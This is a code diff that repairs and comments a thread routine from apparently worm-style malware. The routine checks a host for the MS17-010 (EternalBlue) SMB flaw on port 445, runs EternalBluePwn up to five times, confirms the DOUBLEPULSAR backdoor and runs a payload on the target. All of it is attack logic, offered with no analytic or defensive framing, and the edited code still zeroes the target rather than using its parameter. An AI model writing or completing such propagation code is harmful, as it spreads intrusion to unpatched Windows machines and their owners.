@@ -76,25 +76,28 @@ int canConnectToPort445(char* ip) {
 }
 
 DWORD MS17_010(DWORD LPPARAM) {
-    lpparam = (struct in_addr);
-    int attemptCount;
-    //CheckMS17Vulnerability here; continue if vulnerable
+    struct in_addr target; // fix variable name and specify the type of target
+    memset(&target, 0, sizeof(target)); // initialize target
+    int attemptCount = 0; // initialize attemptCount
+    // Check if the target is vulnerable to MS17-010 exploit
     if (CheckForEternalBlue(&target, 445)) {
-        attemptCount = 0;
         do {
-            Sleep(3000);
+            Sleep(3000); // wait for 3 seconds before checking for DOUBLEPULSAR
             if (IsDOUBLEPULSARInstalled(&target, 1, 445))
                 break;
-            Sleep(3000);
-        //EternalBlue pwn here
+            Sleep(3000); // wait for 3 seconds before trying EternalBlue exploit again
+            // Exploit the target using EternalBlue
             EternalBluePwn(&target, 445);
             ++attemptCount;
         } while (attemptCount < 5);
     }
-    Sleep(3000);
+    Sleep(3000); // wait for 3 seconds before checking for DOUBLEPULSAR again
+    // Check if DOUBLEPULSAR is installed on the target
     if (IsDOUBLEPULSARInstalled(&target, 1, 445)) {
+        // Run the payload on the target
         runPayloadOnTarget(&target, 1, 445);
     }
+    // End the thread
     endthreadex(0);
     return 0;
 }
